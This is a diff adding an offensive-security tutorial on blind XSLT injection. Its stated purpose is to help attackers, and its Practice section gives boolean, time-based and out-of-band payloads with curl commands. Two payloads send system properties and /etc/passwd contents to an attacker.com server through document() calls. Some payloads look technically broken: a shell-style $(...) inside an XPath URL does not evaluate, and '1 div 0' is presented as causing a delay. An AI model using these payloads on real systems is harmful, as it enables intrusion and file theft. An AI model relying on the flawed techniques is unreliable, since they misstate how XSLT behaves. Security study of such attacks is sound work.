@@ -1,0 +1,119 @@
+---
+title: Exploit Blind XSLT Injection Techniques
+description: Learn to utilize blind XSLT injection for data extraction via boolean,
+  time-based, and out-of-band methods.
+keywords:
+- Blind XSLT Injection
+- Data Extraction
+- Boolean Blind XSLT
+- Time-Based XSLT Injection
+- Out-of-Band XSLT
+- XSLT Vulnerabilities
+- Data Exfiltration
+- XSLT Functions
+- Cybersecurity Techniques
+---
+
+# Blind XSLT Injection
+
+## Context
+
+The objective of this article is to enable offensive operators to exploit blind XSLT injection vulnerabilities in web applications. This technique is valuable for scenarios where attacker input is processed by vulnerable XSLT engines without any direct output. It allows inferential attacks to extract data by observing indirect signals such as timing, errors, or out-of-band channels (OOB). Assumed prerequisites for this content include an understanding of XSLT processing internals, XML parsing in web applications, crafting HTTP requests, and general XSLT injection techniques.
+
+## Theory
+
+### Nature of Blind XSLT Injection
+
+Blind XSLT injection occurs when an attacker can inject malicious XSLT code into a web application that processes input using an XSLT engine. However, unlike a direct XSLT injection attack where results are directly displayed, the output in blind injection is not visible to the attacker. Instead, the attacker infers success or failure through indirect signals such as application behavior, timing variations, or out-of-band responses.
+
+### Blind Data Extraction Strategies
+
+#### Boolean-based Blind XSLT Injection
+
+In a boolean-based strategy, attackers exploit conditional logic within the XSLT script to trigger different types of observable responses depending on whether certain conditions are met. Success is inferred through the presence or absence of errors triggered by these conditions.
+
+#### Time-based Blind XSLT Injection
+
+Time-based extraction uses XSLT functions to intentionally slow down the response of the application if a particular condition evaluates to true. Attackers measure the response time to infer the presence of sensitive data, effectively allowing them to deduce information based on processing delays.
+
+#### Out-of-Band Blind XSLT Injection
+
+Out-of-band attacks involve forcing the XSLT engine to send external HTTP or DNS requests to an attacker-controlled server. By doing so, data can be exfiltrated without using the normal application's output channels, making it ideal for bypassing output filters and restrictions.
+
+### Conditional XSLT Responses
+
+In blind XSLT injection, applications may not show XSLT output directly. However, applications can reflect errors, timing differences, or other minor side effects that attackers can measure to infer results. Using this inferential logic, attackers can encode data within these side effects, effectively bypassing output restrictions.
+
+### XSLT Functions for Blind Attacks
+
+XSLT provides powerful functions like `document()`, `system-property()`, and custom extension elements that enable implementing conditional logic. These functions allow attackers to access system properties, make external calls, and carry out complex logic. Permissive XSLT engines may support network or file operations, facilitating out-of-band data exfiltration.
+
+## Practice
+
+### Boolean-Based Blind XSLT Injection
+
+- **Objective:** Infer system property values through error-based boolean logic.
+- **Payload:**
+
+    ```xml
+    <xsl:if test="substring(system-property('os.name'),1,1)='W'">
+        <xsl:message terminate="yes">A</xsl:message>
+    </xsl:if>
+    ```
+
+- **Command:**
+
+    ```bash
+    curl -i -X POST -d "xml=<payload>" http://target/app
+    ```
+
+- **Explanation:** This payload triggers an error if the operating system name starts with 'W' (e.g., Windows). The presence of an error in the response indicates a true condition.
+
+### Time-Based Blind XSLT Injection
+
+- **Objective:** Extract data by correlating response time with injected logic.
+- **Payload:**
+
+    ```xml
+    <xsl:if test="substring(system-property('user.name'),1,1)='a'">
+        <xsl:variable name="x" select="1 div 0"/>
+    </xsl:if>
+    ```
+
+- **Command:**
+
+    ```bash
+    curl -w '%{time_total}\\n' -X POST -d "xml=<payload>" http://target/app
+    ```
+
+- **Explanation:** Here, a deliberate division-by-zero condition induces a delay when the condition is true, allowing inference based on response timing.
+
+### Out-of-Band (OOB) Blind XSLT Injection via DNS
+
+- **Objective:** Exfiltrate sensitive data via external HTTP/DNS requests.
+- **Payload:**
+
+    ```xml
+    <xsl:variable name="x" select="document('http://attacker.com/$(substring(system-property('user.name'),1,1))')"/>
+    ```
+
+- **Explanation:** This forces the XSLT engine to make an HTTP request to an attacker-controlled server with leaked data. Monitor incoming requests on the attacker server to capture exfiltrated data.
+
+### Blind File Read via XSLT OOB
+
+- **Objective:** Read server files by exfiltrating contents through OOB requests.
+- **Payload:**
+
+    ```xml
+    <xsl:variable name="x" select="document('http://attacker.com/$(substring(document('file:///etc/passwd'),1,1))')"/>
+    ```
+
+- **Explanation:** This payload attempts to leak the first character of `/etc/passwd` by sending it as part of an HTTP request. Capture these requests to reconstruct the file contents character by character.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **tcpdump**
+- **Responder**
+- **Custom HTTP/DNS listener**
